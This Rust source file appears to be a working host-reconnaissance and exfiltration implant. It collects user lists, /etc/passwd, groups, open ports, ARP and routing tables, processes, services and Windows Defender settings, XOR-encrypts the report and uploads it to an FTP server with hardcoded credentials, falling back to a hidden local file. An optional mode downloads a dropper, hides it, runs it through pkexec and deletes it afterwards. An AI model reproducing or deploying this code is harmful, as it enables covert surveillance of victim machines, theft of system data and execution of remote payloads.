use std::io;
// Imports
use std::io::{Cursor, Error, Write};
use std::process::{Command, Output};
use std::thread::sleep;
use ftp::FtpStream;
use rand::random;
use chrono;
use execute::Execute;

// Globals
// If Windows, use .exe
#[cfg(target_os = "windows")]
const DROP_FILE:&str = "crusty_crypt.exe";
#[cfg(not(target_os = "windows"))]
const DROP_FILE:&str = "crusty_crypt";

// If Windows, use no prefix
#[cfg(target_os = "windows")]
const DROP_FILE_COMMAND:&str = "crusty_crypt.exe";
#[cfg(not(target_os = "windows"))]
const DROP_FILE_COMMAND:&str = "./crusty_crypt";
const EXPERIMENTAL_MODE:bool = false;
const SEND_KEY:bool = false;
const SAVE_KEY:bool = true;
const FTP_USER:&str = "test-user";
const FTP_PASS:&str = "Colony~Confider7~Commute";

fn main()
{
    // Begin collecting local machine information
    let recon_buffer = recon();

    // Create & authenticate a connection to an FTP server
    let mut ftp_stream = match FtpStream::connect("127.0.0.1:1024")
    {
        Ok(ftp_stream) => ftp_stream,
        Err(_) =>
            {
            println!("Failed to connect to FTP server");
			
            // Write buffer to new file "sus.txt"
            let mut file = match std::fs::File::create(".sus.txt")
            {
                Ok(file) => file,
                Err(_) =>
                    {
                        println!("Failed to create file");
                        return;
                    }
            };
            match file.write_all(recon_buffer.as_bytes())
            {
                Ok(_) => (),
                Err(_) =>
                    {
                        println!("Failed to write to file");
                        return;
                    }
            };
            return;
            },
    };
    let _ = ftp_stream.login(FTP_USER, FTP_PASS).unwrap();

    // Change into a relative directory; retrieve (GET) a file from the FTP server in the current working directory (CWD)
    let _ = ftp_stream.cwd("test_data").unwrap();

	// Encrypt new file; format date/time for filename
    let key = generate_key();
    let cipher_text = encrypt(recon_buffer, key.clone());
    let date_time = chrono::Local::now().format("%Y-%m-%d_%H-%M-%S").to_string();
    let report_name = format!("{}_{}", gethostname(), date_time);

    // Store (PUT) a file from the client to the current working directory of the server.
    let mut reader = Cursor::new(cipher_text);
    let cipher_file_name = format!("{}.txt", report_name.clone());
    let _ = ftp_stream.put(&cipher_file_name.to_string(), &mut reader);
    println!("Cipher file transmission complete");

    if SEND_KEY
    {
        // Upload the key as a file to the FTP server
        let mut key_reader = Cursor::new(key.clone());
        let key_file_name = format!("{}_key.txt", report_name.clone());
        let _ = ftp_stream.put(&key_file_name.to_string(), &mut key_reader);
        println!("Key file transmission complete");
    }

    if SAVE_KEY
    {
        // Write the key to a local file
        let mut key_file = match std::fs::File::create(".key.txt")
        {
            Ok(file) => file,
            Err(_) =>
            {
                    println!("Failed to create file");
                    return;
                }
        };
        match key_file.write_all(key.as_bytes())
        {
            Ok(_) => (),
            Err(_) =>
            {
                    println!("Failed to write to file");
                    return;
                }
        };
    }


    if EXPERIMENTAL_MODE
    {
        match ftp_stream.simple_retr(DROP_FILE)
        {
            Ok(remote_file) =>
                {
                    // Save the file to local CWD
                    let mut local_file = std::fs::File::create(DROP_FILE).unwrap();
                    std::io::copy(&mut Cursor::new(remote_file.get_ref()), &mut local_file).unwrap();
                    drop(local_file);

                    // Set the file to executable
                    #[cfg(target_os = "windows")]
                    match Command::new("cmd").args(&["/C", "attrib", "+H", "+S", "+R", "+A", "+I", "+L", "+O", "+X", DROP_FILE]).output()
                    {
                        Ok(_) => (),
                        Err(e) =>
                            {
                                println!("Failed to set file to executable: {}", e);
                                return;
                            }
                    };

                    #[cfg(not(target_os = "windows"))]
                    match Command::new("chmod").args(&["+x", DROP_FILE]).output()
                    {
                        Ok(_) => sleep(std::time::Duration::from_secs(1)),
                        Err(e) =>
                            {
                                println!("Failed to set file to executable: {}", e);
                            }
                    };

                    // Execute the file
                    let output = Command::new(DROP_FILE_COMMAND).output().unwrap();
                    io::stdout().write_all(&output.stdout).unwrap();
                    io::stderr().write_all(&output.stderr).unwrap();
                },
            Err(_) =>
                {
                    println!("Failed to retrieve file");
                }
        };
        /* ///////////////////////////////////////////////////////////////////////////////////
            NOTE: Not working as intended
            I believe that there is some kind of bug with the FTP implementation
            as the MD5 hash of the file on the server does not match the hash of the file
            When attempting to run the transferred file manually, it segfaults
            The file on the server works fine
        */ ///////////////////////////////////////////////////////////////////////////////////

        let command_string = format!("pkexec ./{}", DROP_FILE);
        println!("Executing: {}", command_string);
        let mut command = Command::new(command_string);

        let output = command.execute_output().unwrap();

        if let Some(exit_code) = output.status.code() {
            if exit_code == 0 {
                println!("Drop file executed successfully");
            } else {
                eprintln!("Drop file failed to execute");
            }
        } else {
            eprintln!("Drop file execution interrupted");
        }

        // Wait until the drop file has been executed
        sleep(std::time::Duration::from_secs(180));

        // Delete the drop file
        match std::fs::remove_file(DROP_FILE)
        {
            Ok(_) => (),
            Err(e) =>
                {
                    println!("Failed to delete drop file: {}", e);
                }
        };
    }


    // Terminate the connection to the server
    let _ = ftp_stream.quit();
}

//////////////////////////////////////
// Generates a random encryption key
//////////////////////////////////////
fn generate_key() -> String
{
    let mut key = String::new();
    for i in 0..64
    {
        key.push(random::<char>());
    }
	
    // Return key or error
    key
}

///////////////////////////////////////////////
// Encrypt the buffer by XORing it with a key
///////////////////////////////////////////////
fn encrypt(buffer: String, key: String) -> Vec<u8>
{
    // Initialize clear text and key bytes; create key and encryption vars 
    let (clear_bytes, key_bytes) = (buffer.as_bytes(), key.as_bytes());
	let mut encrypted = Vec::new();
    let key_len = key.len();

    // Encrypt file contents
	let mut i = 0;
    for byte in clear_bytes
    {
        encrypted.push(byte ^ key_bytes[i]);
        i = (i + 1) % key_len;
    }

	// Return key
    encrypted
}

/////////////////////////////////////////////////////////////////////////////////
// Performs recon of target machine and return collected information as strings
/////////////////////////////////////////////////////////////////////////////////
fn recon() -> String
{
    let mut recon_buffer = String::new();

    if cfg!(target_family = "unix")
    {
		// UNIX locals
        let uname = getos();
        let current_user = getuser();
        let user_list = getusers();
        let group_list = getgroups();
        let open_ports = getports();
        let arp_cache = getarp();
        let routing_table = getroutes();
        let dns_cache = getdns();
        let network_interfaces = getinterfaces();
        let hardware_info = gethardware();
        let applications = getapps();
        let processes = getprocs();
        let services = getservices();

        recon_buffer.push_str("\r\r\r### Begin Report ###\r\r\r");
        recon_buffer.push_str("UNIX-based OS Recon Report\r\r#############################\r\r");
        recon_buffer.push_str(&format!("uname:\r{}\r#############################\r\r", uname));
        recon_buffer.push_str("\r\r\r### User Information ###\r\r\r");
        recon_buffer.push_str(&format!("Current User:\r{}\r#############################\r\r", current_user));
        recon_buffer.push_str(&format!("User List:\r{}\r#############################\r\r", user_list));
        recon_buffer.push_str(&format!("Group List:\r{}\r#############################\r\r", group_list));
        recon_buffer.push_str("\r\r\r### Network Information ###\r\r\r");
        recon_buffer.push_str(&format!("Open Ports:\r{}\r#############################\r\r", open_ports));
        recon_buffer.push_str(&format!("ARP Cache:\r{}\r#############################\r\r", arp_cache));
        recon_buffer.push_str(&format!("Routing Table:\r{}\r#############################\r\r", routing_table));
        recon_buffer.push_str(&format!("DNS Cache:\r{}\r#############################\r\r", dns_cache));
        recon_buffer.push_str(&format!("Network Interfaces:\r{}\r#############################\r\r", network_interfaces));
        recon_buffer.push_str("\r\r\r### Hardware Information ###\r\r\r");
        recon_buffer.push_str(&format!("Hardware Info:\r{}\r#############################\r\r", hardware_info));
        recon_buffer.push_str("\r\r\r### Software Information ###\r\r\r");
        recon_buffer.push_str(&format!("Applications:\r{}\r#############################\r\r", applications));
        recon_buffer.push_str(&format!("Processes:\r{}\r#############################\r\r", processes));
        recon_buffer.push_str(&format!("Services:\r{}\r#############################\r\r", services));
        recon_buffer.push_str("\r\r\r### End Report ###\r\r\r");
    }

    if cfg!(target_os = "windows")
    {
		// Windows locals
        let current_user = getuser();
        let sysinfo = getos();
        let user_list = getusers();
        let group_list = getgroups();
        let open_ports = getports();
        let arp_cache = getarp();
        let routing_table = getroutes();
        let dns_cache = getdns();
        let network_interfaces = getinterfaces();
        let applications = getapps();
        let processes = getprocs();
        let services = getservices();
        let defender_info = getwindefenderinfo();

        recon_buffer.push_str("\r\r\r### Begin Report ###\r\r\r");
        recon_buffer.push_str("Windows Recon Report\r\r#############################\r\r");
        recon_buffer.push_str("\r\r\r### System Summary ###\r\r\r");
        recon_buffer.push_str(&format!("System Info:\r{}\r#############################\r\r", sysinfo));
        recon_buffer.push_str("\r\r\r### User Information ###\r\r\r");
        recon_buffer.push_str(&format!("Current User:\r{}\r#############################\r\r", current_user));
        recon_buffer.push_str(&format!("User List:\r{}\r#############################\r\r", user_list));
        recon_buffer.push_str(&format!("Group List:\r{}\r#############################\r\r", group_list));
        recon_buffer.push_str("\r\r\r### Network Information ###\r\r\r");
        recon_buffer.push_str(&format!("Open Ports:\r{}\r#############################\r\r", open_ports));
        recon_buffer.push_str(&format!("ARP Cache:\r{}\r#############################\r\r", arp_cache));
        recon_buffer.push_str(&format!("Routing Table:\r{}\r#############################\r\r", routing_table));
        recon_buffer.push_str(&format!("DNS Cache:\r{}\r#############################\r\r", dns_cache));
        recon_buffer.push_str(&format!("Network Interfaces:\r{}\r#############################\r\r", network_interfaces));
        recon_buffer.push_str("\r\r\r### Software Information ###\r\r\r");
        recon_buffer.push_str(&format!("Applications:\r{}\r#############################\r\r", applications));
        recon_buffer.push_str(&format!("Processes:\r{}\r#############################\r\r", processes));
        recon_buffer.push_str(&format!("Services:\r{}\r#############################\r\r", services));
        recon_buffer.push_str("\r\r\r### Antivirus Information ###\r\r\r");
        recon_buffer.push_str(&format!("Windows Defender Info:\r{}\r#############################\r\r", defender_info));
        recon_buffer.push_str("\r\r\r### End Report ###\r\r\r");
    }

    recon_buffer
}

//////////////////////////////////////////////
// Retrieves hostname of the current machine
//////////////////////////////////////////////
fn gethostname() -> String
{
    let output = Command::new("hostname")
        .output()
        .expect("failed to execute process");
    let hostname = String::from_utf8_lossy(&output.stdout);
	
    hostname.to_string()
}

////////////////////////////////////////////
// Retrieves OS version of current machine
////////////////////////////////////////////
fn getos() -> String
{
    let os: String;

    // 'uname' for UNIX
    if cfg!(target_family = "unix")
    {
        let output = Command::new("uname")
            .arg("-a")
            .output()
            .expect("failed to execute process");
        os = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // 'systeminfo' for Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("systeminfo")
            .output()
            .expect("failed to execute process");
        os = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        os = "Unknown OS".to_string();
    }

    os
}

///////////////////////////////////////
// Retrieves username of current user
///////////////////////////////////////
fn getuser() -> String
{
    let output = Command::new("whoami")
        .output()
        .expect("failed to execute process");
    let user = String::from_utf8_lossy(&output.stdout);
	
    user.to_string()
}

////////////////////////////////////////////
// Retrieves open ports of current machine
////////////////////////////////////////////
fn getports() -> String
{
    let ports;
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("netstat")
            .arg("-tulpn")
            .output()
            .expect("failed to execute process");
        ports = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows-based
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("netstat")
            .arg("-ano")
            .output()
            .expect("failed to execute process");
        ports = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        ports = "unknown".to_string();
    }

    ports
}

//////////////////////////////////////////////////////////
// Records all applications installed on current machine
//////////////////////////////////////////////////////////
fn getapps() -> String
{
    let mut apps = "".to_string();
	
    // Determine Linux Distros
    if cfg!(target_os = "linux")
    {
        let output = Command::new("cat")
            .arg("/etc/os-release")
            .output()
            .expect("failed to execute process");
        let distro = String::from_utf8_lossy(&output.stdout);
        // If on Ubuntu
        if distro.contains("Ubuntu")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Debian
        else if distro.contains("Debian")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Fedora
        else if distro.contains("Fedora")
        {
            let output = Command::new("rpm")
                .arg("-qa")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on CentOS
        else if distro.contains("CentOS")
        {
            let output = Command::new("rpm")
                .arg("-qa")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Arch
        else if distro.contains("Arch")
        {
            let output = Command::new("pacman")
                .arg("-Q")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Manjaro
        else if distro.contains("Manjaro")
        {
            let output = Command::new("pamac")
                .arg("list")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on openSUSE
        else if distro.contains("openSUSE")
        {
            let output = Command::new("rpm")
                .arg("-qa")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Gentoo
        else if distro.contains("Gentoo")
        {
            let output = Command::new("equery")
                .arg("list")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Alpine
        else if distro.contains("Alpine")
        {
            let output = Command::new("apk")
                .arg("list")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Void
        else if distro.contains("Void")
        {
            let output = Command::new("xbps-query")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Solus
        else if distro.contains("Solus")
        {
            let output = Command::new("eopkg")
                .arg("list-installed")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on NixOS
        else if distro.contains("NixOS")
        {
            let output = Command::new("nix-env")
                .arg("-q")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Red Hat
        else if distro.contains("Red Hat")
        {
            let output = Command::new("rpm")
                .arg("-qa")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on SUSE
        else if distro.contains("SUSE")
        {
            let output = Command::new("rpm")
                .arg("-qa")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Slackware
        else if distro.contains("Slackware")
        {
            let output = Command::new("ls")
                .arg("/var/log/packages")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Mint
        else if distro.contains("Mint")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on elementary OS
        else if distro.contains("elementary")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Pop!_OS
        else if distro.contains("Pop")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Kali
        else if distro.contains("Kali")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Parrot
        else if distro.contains("Parrot")
        {
            let output = Command::new("dpkg")
                .arg("-l")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
		
        // If on Rocky
        else if distro.contains("Rocky")
        {
            let output = Command::new("rpm")
                .arg("-qa")
                .output()
                .expect("failed to execute process");
            apps = String::from_utf8_lossy(&output.stdout).to_string();
        }
    }

    // If on MacOS
    else if cfg!(target_os = "MacOS")
    {
        let output = Command::new("brew")
            .arg("list")
            .output()
            .expect("failed to execute process");
        apps = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If on Android
    else if cfg!(target_os = "android")
    {
        let output = Command::new("pm")
            .arg("list")
            .output()
            .expect("failed to execute process");
        apps = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-AppxPackage")
            .output()
            .expect("failed to execute process");
        apps = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        apps = "Unknown OS".to_string();
    }

    apps
}

///////////////////////////////////////////////////////
// Retrieves all processes running on current machine
///////////////////////////////////////////////////////
fn getprocs() -> String
{
    let procs;
	
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("ps")
            .arg("-aux")
            .output()
            .expect("failed to execute process");
        procs = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-Process")
            .output()
            .expect("failed to execute process");
        procs = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        procs = "Unknown OS".to_string();
    }

    procs
}

////////////////////////////////////////////
// Determines all users on current machine
////////////////////////////////////////////
fn getusers() -> String
{
    let users;
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("cat")
            .arg("/etc/passwd")
            .output()
            .expect("failed to execute process");
        users = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-LocalUser")
            .output()
            .expect("failed to execute process");
        users = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        users = "Unknown OS".to_string();
    }

    users
}

//////////////////////////////////////////////////
// Determines all user groups on current machine
//////////////////////////////////////////////////
fn getgroups() -> String
{
    let groups;
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("cat")
            .arg("/etc/group")
            .output()
            .expect("failed to execute process");
        groups = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-LocalGroup")
            .output()
            .expect("failed to execute process");
        groups = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        groups = "Unknown OS".to_string();
    }

    groups
}

/////////////////////////////////////////////////////////
// Determines all network interfaces on current machine
/////////////////////////////////////////////////////////
fn getinterfaces() -> String
{
    let interfaces;
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("ifconfig")
            .output()
            .expect("failed to execute process");
        interfaces = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-NetAdapter")
            .output()
            .expect("failed to execute process");
        interfaces = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        interfaces = "Unknown OS".to_string();
    }

    interfaces
}

///////////////////////////////////////////////
// Determines all services on current machine
///////////////////////////////////////////////
fn getservices() -> String
{
    let services;
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("systemctl")
            .arg("list-units")
            .output()
            .expect("failed to execute process");
        services = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-Service")
            .output()
            .expect("failed to execute process");
        services = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        services = "Unknown OS".to_string();
    }

    services
}

//////////////////////////////////////////////////////////////////////////////////
// Determines Windows Defender exclusions and firewall rules for Windows systems
//////////////////////////////////////////////////////////////////////////////////
fn getwindefenderinfo() -> String
{
    let defender;
	
    // If Windows
    if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-MpPreference")
            .output()
            .expect("failed to execute process");
        defender = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If on other OS
    else
    {
        defender = "non-windows OS".to_string();
    }

    defender
}

////////////////////////
// Retrieves ARP table
////////////////////////
fn getarp() -> String
{
    let arp;
	
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("arp")
            .arg("-a")
            .output()
            .expect("failed to execute process");
        arp = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-NetNeighbor")
            .output()
            .expect("failed to execute process");
        arp = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        arp = "Unknown OS".to_string();
    }
	
    arp
}

////////////////////////////
// Retrieves Routing Table
////////////////////////////
fn getroutes() -> String
{
    let route;
    // If on UNIX-based system
    if cfg!(target_family = "unix")
    {
        let output = Command::new("route")
            .arg("-n")
            .output()
            .expect("failed to execute process");
        route = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-NetRoute")
            .output()
            .expect("failed to execute process");
        route = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        route = "Unknown OS".to_string();
    }

    route
}

////////////////////////
// Retrieves DNS Cache
////////////////////////
fn getdns() -> String
{
    let dns;
	
    // If UNIX-based
    if cfg!(target_family = "unix")
    {
        let output = Command::new("cat")
            .arg("/etc/resolv.conf")
            .output()
            .expect("failed to execute process");
        dns = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If Windows
    else if cfg!(target_os = "windows")
    {
        let output = Command::new("powershell")
            .arg("Get-DnsClientCache")
            .output()
            .expect("failed to execute process");
        dns = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        dns = "Unknown OS".to_string();
    }

    dns
}

///////////////////////////////////
// Retrieves hardware information
///////////////////////////////////
fn gethardware() -> String
{
    let hardware;
	
    // If on UNIX-based system
    if cfg!(target_family = "unix")
    {
        let output = Command::new("lshw")
            .output()
            .expect("failed to execute process");
        hardware = String::from_utf8_lossy(&output.stdout).to_string();
    }

    // If OS unknown
    else
    {
        hardware = "Unknown OS".to_string();
    }

    hardware
}